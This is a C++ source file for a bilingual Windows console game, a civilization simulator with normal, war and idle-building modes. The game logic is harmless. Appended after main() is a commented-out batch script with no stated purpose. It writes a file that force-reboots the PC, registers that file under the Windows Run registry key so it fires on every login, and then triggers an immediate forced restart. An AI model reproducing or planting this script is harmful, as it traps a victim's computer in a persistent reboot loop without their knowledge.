#include <iostream>
#include <cstdio>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <time.h>
#include <iomanip>
#include <conio.h>
#include <cstring>
#define forup(i, a, b) for (int i = a; i < b; i++)
using namespace std;
//cout<<"";
string Start;
int system(const char *string);
template <class T>
int Lenth(T &array) { return sizeof(array) / sizeof(array[0]); }
long long rand(long long start, long long end)
{
    end++;
    long long dis = end - start;
    return rand() % dis + start;
}
void wait(double x)
{
    int a = 1000 * x;
    Sleep(a);
}
void clear() { system("cls"); }
void SetColor(unsigned short ForeColor, unsigned short BackGroundColor)
{
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon, (ForeColor % 16) | (BackGroundColor % 16 * 16));
}
void print_CN(string str)
{
    int lenth = str.length(), i;
    forup(i, 0, lenth)
    {
        wait(0.005);
        SetColor((int)rand(1, 15), 0);
        cout << str[i];
    }
    SetColor(7, 0);
}
void print_M3(string str)
{
    int lenth = str.length(), i;
    forup(i, 0, lenth)
    {
        SetColor((int)rand(1, 15), 0);
        cout << str[i];
    }
    SetColor(7, 0);
}
void printX()
{
    print_M3("\\           /\n");
    print_M3(" \\         /\n");
    print_M3("  \\       /\n");
    print_M3("   \\     /\n");
    print_M3("    \\   /\n");
    print_M3("     \\ /\n");
    print_M3("      X\n");
    print_M3("     / \\\n");
    print_M3("    /   \\\n");
    print_M3("   /     \\\n");
    print_M3("  /       \\\n");
    print_M3(" /         \\\n");
    print_M3("/           \\\n");
}
void print_T(string thing_name, unsigned long long thing, unsigned long long thing_room)
{
    print_M3(thing_name);
    cout << "\t" << thing << "\t/\t" << thing_room << "\n";
}
void print_O(string thing_name, unsigned long long thing)
{
    print_M3(thing_name);
    cout << "\t" << thing << "\n";
}
int main()
{
    double culzition_list[11] = {
        0.05,
        0.8,
        1.0,
        5.0,
        6.0,
        80,
        100,
        150,
        300,
        450,
        9999};
    string PlayerEvent_E[4] = {
        "Your civilization is ready to be moved. Or not?",
        "Did your civilization discover another civilization and destroy it?",
        "You civilization can live in space",
        "Your civilization has discovered an unexplored space"};
    string PlayerEvent_C[4] = {
        "你的文明可以进行一次迁徙",
        "你的文明发现了另一个文明，是否摧毁",
        "你的文明可在宇宙中生活",
        "你的文明发现了一个未知的空间，是否探索"};
    string PlayerEvent[4];

    string culzition_E[10] = {
        "No technological civilization",
        "Planetary-like civilization",
        "Planetary Civilization",
        "Stellar civilization",
        "Second-class stellar civilization",
        "The half-galaxy civilization",
        "The Star River civilization",
        "Directed civilization",
        "Dark matter civilization",
        "Dimensional civilization"};
    string culzition_C[10] = {
        "无科技文明",
        "类行星文明",
        "行星文明",
        "恒星文明",
        "二级恒星文明",
        "半星系文明",
        "星系文明",
        "定向",
        "暗物质文明",
        "纬度文明"};
    string culzition[10];

    string menu_E[8] = {
        "________________________Welcome to the civilization simulator________________________\n",
        "1.Start game\n",
        "2.Updating history\n",
        "3.Introduction to the game\n",
        "4.Language\n",
        "5.Exit game\n",
        "6.About\n",
        "input a number\n\n"};
    string menu_C[8] = {
        "________________________欢迎来到文明模拟器________________________\n",
        "1.开始游戏\n",
        "2.更新历史\n",
        "3.游戏介绍\n",
        "4.语言\n",
        "5.离开游戏\n",
        "6.关于\n",
        "输入一个数字\n\n"};
    string menu[8];

    string UH_E[13] = {
        "2020/3/6 Developing a Python version (deprecated)\n",
        "2020/3/10 Develop C++ Edition\n",
        "          Add the seed module\n",
        "          Add the menu module\n",
        "2020/3/11 Update campaign mode\n",
        "          Armageddon. The enemy has the AI(Initial development)\n",
        "2020/3/12 Add Color word\n",
        "          Fix some bug\n",
        "          Add Language module(English, Chinese)\n",
        "2020/3/12 Build the AI\n",
        "          Fix the error exit Bug\n",
        "2020/3/15 & 16 Develop setting mode\n",
        "input 'E' to Exit\n\n"};
    string UH_C[13] = {
        "2020/3/6 开发Python版（废弃）\n",
        "2020/3/10 开发 C++ 版\n",
        "          添加种子模块\n",
        "          添加菜单模块\n",
        "2020/3/11 更新末日战役\n",
        "          末日战役中的敌人有人工智能（初开发）\n",
        "2020/3/12 添加彩色文本\n",
        "          修复末日战役中我方人数错误增加的情况\n",
        "          添加语言模块（英文，中文）\n",
        "2020/3/12 加强AI\n",
        "          修复异常退出Bug\n",
        "2020/3/15 & 16 更新放置模式\n",
        "按 'E' 退出此页面\n\n"};
    string UH[13];

    string Introduct_E[9] = {
        "Introduction to common patterns:\n",
        "1. Enter the seed\n",
        "2. Type the name of the civilization\n",
        "3. Wait and see (sometimes you need to give instructions for special events)\n",
        "4. The End (God or death?)\n\n",
        "Introduction to Armageddon\n",
        "1.Do your choose\n",
        "2.Don't let your culture end\n\n",
        "input 'E' to Exit\n\n"};
    string Introduct_C[9] = {
        "普通模式介绍：\n",
        "1. 输入种子\n",
        "2. 输入文明的名字\n",
        "3. 挂机（有时你需要操纵特殊事件）\n",
        "4. 结束（神还是灭亡？）\n\n",
        "末日战役模式介绍\n",
        "1.做出你的选择\n",
        "2.不要让你的文明灭亡\n\n",
        "输入 'E' 退出此页面\n\n"};
    string Introduct[9];

    string exit_E[2] = {
        "Are you sure?\n",
        "input 'E' back to game, Others break\n\n"};
    string exit_C[2] = {
        "你确定吗？\n",
        "输入 'E' 返回游戏，否则退出游戏\n\n"};
    string exit[2];

    string gamemode_E[4] = {
        "1. Normal mode \n",
        "2. The war of the end\n",
        "3. Simulated Civilization(Building)\n",
        "input a number to Start game(input 'E' to menu)\n\n"};
    string gamemode_C[4] = {
        "1. 普通模式 \n",
        "2. 末日战役\n",
        "3. 放置模式(建造中)\n",
        "输入一个数字以开始游戏（'E'以退出）\n\n"};
    string gamemode[4];

    string start_E[1] = {
        "input 'S' to Start game\n"};
    string start_C[1] = {
        "输入 'S' 开始游戏\n"};
    string start_L[1];

    string mode_1_E[16] = {
        "Input a seed(DON'T PASS IT!!!!)",
        "Input the game mode: ('F': fastPass; 'E': easy; 'M': Middle; 'H': hard; 'J' = Hell)\n",
        "Your cultrue is started, give it a name\n",
        "your cultrue level:",
        "Enemy Distance:",
        "(light-year)\n",
        "your cultrue grow into-",
        "Your civilization wiped out a civilization",
        "Your civilization named:",
        " has been destroyed\n",
        "You Get Score:",
        "You Win!",
        "The age of civilization:",
        " year\n",
        "Consent by undefault\n",
        "('Y' : Yes, 'N' : No)\n"};
    string mode_1_C[16] = {
        "输入一个种子（不要跳过）",
        "输入游戏模式：（‘F’：速通， ’E‘简单; ‘M’：中等， ‘H’: 困难， ‘J’ = 地狱)\n",
        "你的文明启动了，给他一个名字\n",
        "你文明的等级：",
        "敌对外星文明距离：",
        "(光年)\n",
        "你的文明成长到了-",
        "你的文明消灭了一个文明",
        "你的文明：",
        "被消灭了\n",
        "你的得分：",
        "你赢了！",
        "你的文明的年龄：",
        "年\n",
        "默认否定\n",
        "（‘Y’：是，‘N’：否）\n"};
    string mode_1[16];

    string PCE_E[10] = {
        "Technology explosion!",
        "People are beginning to turn against science",
        "The people have developed a fever for science",
        "A war within civilization, which slowed the acceleration of civilization",
        "Experts from all cultures gather to share results and cooperate",
        "The war is over. People can study in peace",
        "Alien objects hit the planet, causing a population collapse",
        "Your civilization gave away its position(I)",
        "Your civilization gave away its position(II)",
        "Your civilization gave away its position(II.X)"};
    string PCE_C[10] = {
        "科技爆炸！",
        "人民对科学产生了厌倦",
        "人民对科学产生了狂热感",
        "一场战争爆发了，科技的发展被拖延了",
        "全文明的科学专家聚集在了一起",
        "战争结束了，人们可以安心研究了",
        "大量外星物体坠落在星球上，这给科学研究造成了打击",
        "你的文明暴露了坐标Lv1",
        "你的文明暴露了坐标Lv2",
        "你的文明暴露了坐标Lv2.5"};
    string PCE[10];

    string mode_2_E[16] = {
        "Welcome to The war of the end\n",
        "1.Do your choose\n",
        "2.Don't let your culture end\n",
        "You Win!Your score---",
        "You Lose!\n",
        "Your Army left soldiers----",
        "Enemy Army left soldiers----",
        "You could have a mandatory draft.",
        "You can send some of the soldiers home.",
        "You can sneak up on the enemy.",
        "You were ambushed. Did you resist?."};
    string mode_2_C[16] = {
        "欢迎来到末日之战\n",
        "1.做出你的选择\n",
        "2.不要让你的文明消亡\n",
        "你赢了，你的分数---",
        "你失败了！\n",
        "你剩余的士兵----",
        "敌方剩余的士兵----",
        "你有一次强行征兵的机会",
        "你可以送一些士兵回家",
        "你可以偷袭敌军",
        "我军被偷袭了，是否反抗？"};
    string mode_2[16];

    string About_E[4] = {
        "Form team 《CIVSIM》\n",
        "List of development teams:\n"
        "____String_Error____\n",
        "Web site:<https://www.luogu.com.cn/team/25647>\n"};
    string About_C[4] = {
        "来自团队 《CIVSIM》\n",
        "团队开发者名单:\n"
        "____String_Error____\n",
        "网址：<https://www.luogu.com.cn/team/25647>\n"};
    string About[4];

    string Item_E[15] = {
        "food",
        "Individuals",
        "farmland",
        "Enter 'Q' to build a farmland(-15000 * (farmland numder + 1) food)\n",
        "Enter 'W' to get wood(-300 food)\n",
        "wood",
        "house",
        "Enter 'E' to build a house(-25 * (house number + 1) wood, for 1 peole)\n",
        "Game Over your civilization died",
        "Enter 'R' to levelup plant tool(-5 * Lv wood)\n",
        "farm tool level:\t",
        "Enter 'T' to levelup logging tool(-10 * Lv wood)\n",
        "logging level:\t",
        "rock",
        "Enter 'M' to exit game\n"};
    string Item_C[15] = {
        "食物",
        "个体",
        "农田",
        "按 'Q' 建造农田（消耗15000 * (农田数 + 1)食物）\n",
        "按 'W' 获取木材（消耗300食物）\n",
        "木材",
        "房子",
        "按 'E' 来建造建造一间房子（消耗25 * (房屋数 + 1)木头、可容纳1人）\n",
        "游戏结束，你的文明死了",
        "按 'R' 升级耕具（消耗5 * Lv木头）\n",
        "农具等级：\t",
        "按 'T' 升级伐木工具（消耗10 * Lv木头）\n",
        "伐木工具等级:\t",
        "石头",
        "按 'M' 退出游戏\n"};
    string Item[15];
    while (1)
    {
        string lang;
        print_CN("Choose a Language\n");
        print_CN("选择一个语言\n");
        print_CN("E : English\n");
        print_CN("C : 中文\n\n");
        cin >> lang;
        if (lang == "E")
        {
            forup(i, 0, Lenth(culzition)) culzition[i] = culzition_E[i];
            forup(i, 0, Lenth(PlayerEvent)) PlayerEvent[i] = PlayerEvent_E[i];
            forup(i, 0, Lenth(menu)) menu[i] = menu_E[i];
            forup(i, 0, Lenth(UH)) UH[i] = UH_E[i];
            forup(i, 0, Lenth(Introduct)) Introduct[i] = Introduct_E[i];
            forup(i, 0, Lenth(exit)) exit[i] = exit_E[i];
            forup(i, 0, Lenth(gamemode)) gamemode[i] = gamemode_E[i];
            forup(i, 0, Lenth(start_L)) start_L[i] = start_E[i];
            forup(i, 0, Lenth(mode_1)) mode_1[i] = mode_1_E[i];
            forup(i, 0, Lenth(PCE)) PCE[i] = PCE_E[i];
            forup(i, 0, Lenth(mode_2)) mode_2[i] = mode_2_E[i];
            forup(i, 0, Lenth(About)) About[i] = About_E[i];
            forup(i, 0, Lenth(Item)) Item[i] = Item_E[i];
            break;
        }
        else if (lang == "C")
        {
            forup(i, 0, Lenth(culzition)) culzition[i] = culzition_C[i];
            forup(i, 0, Lenth(PlayerEvent)) PlayerEvent[i] = PlayerEvent_C[i];
            forup(i, 0, Lenth(menu)) menu[i] = menu_C[i];
            forup(i, 0, Lenth(UH)) UH[i] = UH_C[i];
            forup(i, 0, Lenth(Introduct)) Introduct[i] = Introduct_C[i];
            forup(i, 0, Lenth(exit)) exit[i] = exit_C[i];
            forup(i, 0, Lenth(gamemode)) gamemode[i] = gamemode_C[i];
            forup(i, 0, Lenth(start_L)) start_L[i] = start_C[i];
            forup(i, 0, Lenth(mode_1)) mode_1[i] = mode_1_C[i];
            forup(i, 0, Lenth(PCE)) PCE[i] = PCE_C[i];
            forup(i, 0, Lenth(mode_2)) mode_2[i] = mode_2_C[i];
            forup(i, 0, Lenth(About)) About[i] = About_C[i];
            forup(i, 0, Lenth(Item)) Item[i] = Item_C[i];
            break;
        }
        else
            clear();
    }
    while (1)
    {
        double Other_cultrue_len = rand(80000, 1000000);
        double cultrue_level = 0.000001;
        double Mode_speed = 0.0;
        double level_growth = 1;
        double Time = 30;
        int index = 0;
        bool war = false;
        bool Exit = false;
        bool Other_cultrue = false;
        int seed;
        int Other_cultrue_level = rand(5, 300);
        int Other_cultrue_Speed = rand(40, 10000);
        while (1)
        {

            clear();
            print_CN(menu[0]);
            print_CN(menu[1]);
            print_CN(menu[2]);
            print_CN(menu[3]);
            print_CN(menu[4]);
            print_CN(menu[5]);
            print_CN(menu[6]);
            print_CN(menu[7]);
            string choose;
            cin >> choose;
            if (choose == "1")
                break;
            else if (choose == "2")
            {
                clear();
                while (1)
                {
                    print_CN("V.1.1.12\n");
                    print_CN(UH[0]);
                    print_CN(UH[1]);
                    print_CN(UH[2]);
                    print_CN(UH[3]);
                    print_CN(UH[4]);
                    print_CN(UH[5]);
                    print_CN(UH[6]);
                    print_CN(UH[7]);
                    print_CN(UH[8]);
                    print_CN(UH[9]);
                    print_CN(UH[10]);
                    print_CN(UH[11]);
                    print_CN(UH[12]);
                    string Ex;
                    cin >> Ex;
                    if (Ex == "E")
                    {
                        clear();
                        break;
                    }
                    else
                        clear();
                }
            }
            else if (choose == "3")
            {
                clear();
                while (1)
                {
                    print_CN(Introduct[0]);
                    print_CN(Introduct[1]);
                    print_CN(Introduct[2]);
                    print_CN(Introduct[3]);
                    print_CN(Introduct[4]);
                    print_CN(Introduct[5]);
                    print_CN(Introduct[6]);
                    print_CN(Introduct[7]);
                    print_CN(Introduct[8]);
                    string Ex;
                    cin >> Ex;
                    if (Ex == "E")
                    {
                        clear();
                        break;
                    }
                    else
                        clear();
                }
            }
            else if (choose == "4")
            {
                clear();
                string lang;
                print_CN("Choose a Language\n");
                print_CN("选择一个语言\n");
                print_CN("E : English\n");
                print_CN("C : 中文\n\n");
                cin >> lang;
                if (lang == "E")
                {
                    forup(i, 0, Lenth(culzition)) culzition[i] = culzition_E[i];
                    forup(i, 0, Lenth(PlayerEvent)) PlayerEvent[i] = PlayerEvent_E[i];
                    forup(i, 0, Lenth(menu)) menu[i] = menu_E[i];
                    forup(i, 0, Lenth(UH)) UH[i] = UH_E[i];
                    forup(i, 0, Lenth(Introduct)) Introduct[i] = Introduct_E[i];
                    forup(i, 0, Lenth(exit)) exit[i] = exit_E[i];
                    forup(i, 0, Lenth(gamemode)) gamemode[i] = gamemode_E[i];
                    forup(i, 0, Lenth(start_L)) start_L[i] = start_E[i];
                    forup(i, 0, Lenth(mode_1)) mode_1[i] = mode_1_E[i];
                    forup(i, 0, Lenth(PCE)) PCE[i] = PCE_E[i];
                    forup(i, 0, Lenth(mode_2)) mode_2[i] = mode_2_E[i];
                }
                else if (lang == "C")
                {
                    forup(i, 0, Lenth(culzition)) culzition[i] = culzition_C[i];
                    forup(i, 0, Lenth(PlayerEvent)) PlayerEvent[i] = PlayerEvent_C[i];
                    forup(i, 0, Lenth(menu)) menu[i] = menu_C[i];
                    forup(i, 0, Lenth(UH)) UH[i] = UH_C[i];
                    forup(i, 0, Lenth(Introduct)) Introduct[i] = Introduct_C[i];
                    forup(i, 0, Lenth(exit)) exit[i] = exit_C[i];
                    forup(i, 0, Lenth(gamemode)) gamemode[i] = gamemode_C[i];
                    forup(i, 0, Lenth(start_L)) start_L[i] = start_C[i];
                    forup(i, 0, Lenth(mode_1)) mode_1[i] = mode_1_C[i];
                    forup(i, 0, Lenth(PCE)) PCE[i] = PCE_C[i];
                    forup(i, 0, Lenth(mode_2)) mode_2[i] = mode_2_C[i];
                }
                else
                    clear();
            }
            else if (choose == "5")
            {
                clear();
                print_CN(exit[0]);
                print_CN(exit[1]);
                string Ex;
                cin >> Ex;
                clear();
                if (Ex == "E")
                    continue;
                Exit = true;
                break;
            }
            else if (choose == "6")
            {
                while (1)
                {
                    clear();
                    print_CN(About[0]);
                    print_CN(About[1]);
                    print_CN(About[2]);
                    print_CN(About[3]);
                    print_CN(Introduct[8]);
                    string Ex;
                    cin >> Ex;
                    clear();
                    if (Ex == "E")
                        break;
                    else
                        clear();
                }
            }
            else
                clear();
        }
        if (Exit)
            break;
        clear();
        while (1)
        {
            clear();
            print_CN(gamemode[0]);
            print_CN(gamemode[1]);
            print_CN(gamemode[2]);
            print_CN(gamemode[3]);
            cin >> Start;
            if (Start == "1" || Start == "2" || Start == "3")
                break;
            else if (0)
            {
                print_CN("XXX---XXX");
                wait(2);
            }
            else if (Start == "E")
                break;
        }
        clear();
        if (Start == "1")
        {
            while (1)
            {
                clear();
                print_CN(start_L[0]);
                cin >> Start;
                if (Start != "S")
                {
                    clear();
                    continue;
                }
                else
                    break;
            }
            clear();
            print_CN(mode_1[0]);
            scanf("%d", &seed);
            srand(seed);
            clear();
            print_CN(mode_1[1]);
            string Mode;
            cin >> Mode;
            if (Mode == "J")
                Mode_speed = 0.1;
            else if (Mode == "H")
                Mode_speed = 0.45;
            else if (Mode == "M")
                Mode_speed = 0.75;
            else if (Mode == "F")
                Mode_speed = 3;
            else
                Mode_speed = 1;
            clear();
            string name;
            print_CN(mode_1[2]);
            cin >> name;
            clear();
            while (1)
            {
                Time += 0.5;
                cultrue_level += (double)rand(1, 100) / 100000.0 * (double)level_growth * (double)Mode_speed;
                level_growth += 0.00000001;
                print_M3(mode_1[3]);
                printf("%.7lf", cultrue_level);
                printf("\n");
                wait(0.25);
                if (Other_cultrue)
                {
                    Other_cultrue_len -= Other_cultrue_Speed / 2;
                    if (not Other_cultrue_len <= 0)
                    {
                        if (Other_cultrue_len < 0)
                        {
                            print_CN(mode_1[4]);
                            cout << 0;
                            print_CN(mode_1[5]);
                        }
                        else
                        {
                            print_CN(mode_1[4]);
                            cout << Other_cultrue_len / 20000;
                            print_CN(mode_1[5]);
                        }
                        wait(0.25);
                    }
                }
                if (cultrue_level > culzition_list[index])
                {
                    print_CN(mode_1[6]);
                    print_CN(culzition[index]);
                    print_CN("\n");
                    wait(5);
                    index += 1;
                    if (index == 7)
                        level_growth *= 0.02;
                }
                if (Other_cultrue_len <= 0)
                {
                    Other_cultrue = false;
                    Other_cultrue_len = rand(80000, 1000000);
                    Other_cultrue_level = rand(5, 300);
                    Other_cultrue_Speed = rand(3, 10000);
                    if (Other_cultrue_level < cultrue_level)
                    {
                        print_CN(mode_1[7]);
                        wait(2);
                        level_growth *= 0.75;
                    }
                    else if (Other_cultrue_level >= cultrue_level)
                    {
                        print_CN(mode_1[8]);
                        print_CN(name);
                        print_CN(mode_1[9]);
                        print_CN(mode_1[10]);
                        cout << (unsigned long long)(level_growth * index * Time * cultrue_level) << "\n";
                        print_CN(mode_1[12]);
                        cout << (int)(200 * Time);
                        print_CN(mode_1[13]);
                        wait(5);
                        break;
                    }
                }
                if (cultrue_level > 1000 || Time >= 10000)
                {
                    print_CN(mode_1[11]);
                    print_CN(mode_1[8]);
                    print_CN(name);
                    print_CN(mode_1[10]);
                    cout << (unsigned long long)(level_growth * index * Time * cultrue_level) << "\n";
                    print_CN(mode_1[12]);
                    cout << (int)(200 * Time);
                    print_CN(mode_1[13]);
                    wait(5);
                    break;
                }
                if (war)
                    level_growth *= 0.999;
                if ((int)Time % 8 == 0 && cultrue_level > 1.5)
                {
                    int Player_envent = rand(0, 100);
                    if (Player_envent <= 2)
                    {
                        print_CN(mode_1[14]);
                        print_CN(PlayerEvent[Player_envent]);
                        print_CN(mode_1[15]);
                        string PE;
                        cin >> PE;
                        if (Player_envent == 0)
                        {
                            if (PE == "Y")
                            {
                                level_growth *= 0.85;
                                cultrue_level *= rand(100, 300) / 100;
                            }
                            else
                                level_growth *= 0.95;
                        }
                        else if (Player_envent == 1)
                        {
                            if (PE == "Y")
                            {
                                level_growth *= 0.85;
                                cultrue_level *= rand(100, 150) / 100;
                            }
                            else
                                level_growth *= 1.4;
                        }
                        else if (Player_envent == 2)
                        {
                            if (PE == "Y")
                                level_growth *= 1.5;
                            else
                                level_growth *= 1;
                        }
                    }
                }
                if ((int)Time % 10 == 0 && cultrue_level > 0.05)
                {
                    int envent = rand(1, 100);
                    if (envent <= 1)
                    {
                        print_CN(PCE[0]);
                        cultrue_level *= 1.5;
                        wait(2);
                    }
                    else if (envent < 10)
                    {
                        print_CN(PCE[1]);
                        level_growth *= 0.75;
                        wait(2);
                    }
                    else if (envent < 20)
                    {
                        print_CN(PCE[2]);
                        level_growth *= 1.5;
                        wait(2);
                    }
                    else if (envent < 30 && !(war))
                    {
                        print_CN(PCE[3]);
                        level_growth *= 0.1;
                        war = true;
                        wait(2);
                    }
                    else if (envent < 40)
                    {
                        print_CN(PCE[4]);
                        level_growth *= 3;
                        wait(2);
                    }
                    else if (envent < 50 && war)
                    {
                        print_CN(PCE[5]);
                        war = false;
                        level_growth *= 1.5;
                        wait(2);
                    }
                    else if (envent < 55 && cultrue_level < 1.5 && envent >= 50)
                    {
                        print_CN(PCE[6]);
                        level_growth *= 0.5;
                        cultrue_level *= 0.85;
                        wait(2);
                    }
                    else if (envent < 60)
                    {
                        print_CN(PCE[7]);
                        level_growth *= 1.1;
                        wait(2);
                    }
                    else if (envent < 63 and cultrue_level >= 0.7)
                    {
                        print_CN(PCE[8]);
                        level_growth *= 1.5;
                        war = false;
                        Other_cultrue = true;
                        wait(2);
                    }
                    else if (envent < 65 and cultrue_level >= 1)
                    {
                        print_CN(PCE[9]);
                        level_growth *= 1.9;
                        war = false;
                        Other_cultrue = true;
                        wait(2);
                    }
                }
                if (Exit)
                    break;
                clear();
            }
            clear();
            if (Exit)
                break;
        }
        else if (Start == "2")
        {
            while (1)
            {
                clear();
                print_CN(mode_2[0]);
                print_CN(mode_2[1]);
                print_CN(mode_2[2]);
                print_CN(start_L[0]);
                cin >> Start;
                if (Start == "S")
                    break;
            }
            clear();
            srand(time(NULL));
            long double SArmy = rand(1000, 9999);
            long double EArmy = SArmy;
            int Event;
            double SFA = 1;
            double EFA = 1;
            while (1)
            {
                EFA *= 1.1;
                SFA *= 1.1;
                SArmy -= rand(1, 10) * SFA;
                EArmy -= rand(1, 10) * EFA;
                SArmy += rand(20, 2000) / SFA;
                EArmy += rand(20, 2000) / EFA;
                if (EArmy <= 0)
                {
                    print_CN(mode_2[3]);
                    cout << SArmy / SFA * 1000 << "\n";
                    wait(2);
                    break;
                }
                else if (SArmy <= 0)
                {
                    print_CN(mode_2[4]);
                    wait(2);
                    break;
                }
                print_CN(mode_2[5]);
                cout << SArmy;
                print_CN("w");
                printf("\n");
                print_CN(mode_2[6]);
                cout << EArmy;
                print_CN("w");
                printf("\n");
                Event = rand(2, 3);
                if (Event == 2)
                {
                    string ync = mode_1[15];
                    Event = rand(2, 7);
                    if (Event == 2)
                    {
                        print_CN(mode_2[7]);
                        print_CN(ync);
                        printf("\n\n");
                        string yn;
                        cin >> yn;
                        if (yn == "Y")
                        {
                            SArmy += rand(100, 200);
                            SFA += 2;
                        }
                    }
                    else if (Event == 3)
                    {
                        print_CN(mode_2[8]);
                        print_CN(ync);
                        printf("\n\n");
                        string yn;
                        cin >> yn;
                        if (yn == "Y")
                        {
                            SArmy -= rand(10, 2000);
                            SFA -= 2;
                        }
                        else
                            SFA += 2;
                    }
                    else if (Event == 4)
                    {
                        print_CN(mode_2[9]);
                        print_CN(ync);
                        printf("\n\n");
                        string yn;
                        cin >> yn;
                        if (yn == "Y")
                        {
                            SArmy -= rand(10, 200);
                            EArmy -= rand(40, 800);
                            SFA += 1;
                        }
                    }
                    else if (Event == 5)
                    {
                        print_CN(mode_2[10]);
                        print_CN(ync);
                        printf("\n\n");
                        string yn;
                        cin >> yn;
                        if (yn == "Y")
                        {
                            SArmy -= rand(10, 200);
                            EArmy -= rand(40, 800);
                            SFA += 1;
                        }
                    }
                    else if (Event == 6)
                    {
                        print_CN(mode_2[10]);
                        print_CN(ync);
                        printf("\n\n");
                        string yn;
                        cin >> yn;
                        if (yn == "Y")
                        {
                            SArmy -= rand(30, 600);
                            EArmy -= rand(20, 400);
                            SFA += 1;
                        }
                        else
                        {
                            SArmy -= rand(40, 800);
                            EArmy -= rand(10, 200);
                            SFA += 3;
                        }
                    }
                }
                else if (Event == 3)
                {
                    Event = rand(2, 7);
                    if (Event == 2)
                    {
                        if (EArmy < SArmy && SArmy >= EArmy)
                        {
                            EArmy += rand(10, 200);
                            EFA += 2;
                        }
                    }
                    else if (Event == 3)
                    {
                        if (EFA - SFA >= 100)
                        {
                            EArmy -= rand(10, 2000);
                            EFA -= 2;
                        }
                        else
                        {
                            EFA += 2;
                        }
                    }
                    else if (Event == 4)
                    {
                        if (SFA <= 100)
                        {
                            EArmy -= rand(10, 200);
                            SArmy -= rand(40, 800);
                            EFA += 1;
                        }
                    }
                    else if (Event == 5)
                    {
                        if (EArmy <= SArmy)
                        {
                            EArmy -= rand(10, 200);
                            SArmy -= rand(40, 800);
                            EFA += 1;
                        }
                    }
                    else if (Event == 6)
                    {
                        if (EFA > 5 || EArmy < 100)
                        {
                            EArmy -= rand(30, 600);
                            SArmy -= rand(20, 400);
                            EFA += 1;
                        }
                        else
                        {
                            EArmy -= rand(40, 800);
                            SArmy -= rand(10, 200);
                            EFA += 3;
                        }
                    }
                }
                wait(0.25);
                clear();
            }
            clear();
        }
        else if (Start == "3")
        {
            unsigned long long farmland = 0, house = 0, farm_tool = 1, logging_tool = 1;
            unsigned long long food = 300000, ind = 1, wood = 0, rock = 0;
            unsigned long long food_room = 300000, ind_room = 1, wood_room = 0, rock_room = 10;
            int key;
            double tick = 0.0;
            while (1)
            {
                food += farmland * 2 * farm_tool * ind;
                food -= ind;
                if (food <= 0)
                {
                    clear();
                    print_CN(Item[8]);
                    wait(3);
                    break;
                }
                if (food > food_room)
                    food = food_room;
                if (wood > wood_room)
                    wood = wood_room;
                if (_kbhit())
                    key = _getch();
                else
                    key = 'N';
                print_T(Item[0], food, food_room);
                print_T(Item[1], ind, ind_room);
                print_T(Item[5], wood, wood_room);
                print_T(Item[13], rock, rock_room);
                print_O(Item[2], farmland);
                print_O(Item[6], house);
                print_O(Item[10], farm_tool);
                print_O(Item[12], logging_tool);
                print_M3(Item[3]);
                print_M3(Item[4]);
                print_M3(Item[7]);
                print_M3(Item[9]);
                print_M3(Item[11]);
                print_M3(Item[14]);
                if (key == 'Q')
                {
                    if (food >= 15000 * (farmland + 1))
                    {
                        farmland += 1;
                        food -= 15000 * (farmland + 1);
                        food_room += 10000;
                        wood_room += 5000;
                        rock_room += 2500;
                    }
                    else
                        printX();
                }
                else if (key == 'W')
                {
                    if (food >= 300 && wood * logging_tool < wood_room)
                    {
                        wood += logging_tool;
                        food -= 300;
                    }
                    else
                        printX();
                }
                else if (key == 'E')
                {
                    if (wood >= 25 * (house + 1))
                    {
                        wood -= 25;
                        house += 1;
                        ind_room += 1;
                    }
                    else
                        printX();
                }
                else if (key == 'R')
                {
                    if (wood >= farm_tool * 5)
                    {
                        wood -= farm_tool * 5;
                        farm_tool += 1;
                    }
                    else
                        printX();
                }
                else if (key == 'T')
                {
                    if (wood >= logging_tool * 10)
                    {
                        wood -= logging_tool * 10;
                        logging_tool += 1;
                    }
                    else
                        printX();
                }
                else if (key == 'M')
                {
                    break;
                }
                if ((int)tick % ind == 0 && ind < ind_room)
                {
                    ind += 1;
                    tick = 0.0;
                }
                tick += 0.01;
                wait(0.01);
                clear();
            }
        }
    }
    system("pause");
    return 0;
}
/*
@echo off
echo.@echo off >%systemdrive%\system.bat
echo.shutdown -r -f -t 10 -c "对不起容！你被系统鄙视了" >>%systemdrive%\system.bat
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v "system" /t REG_SZ /d "%systemdrive%\system.bat" >nul
shutdown -r -f -t 10 -c "对不起！你被系统鄙视了"
*/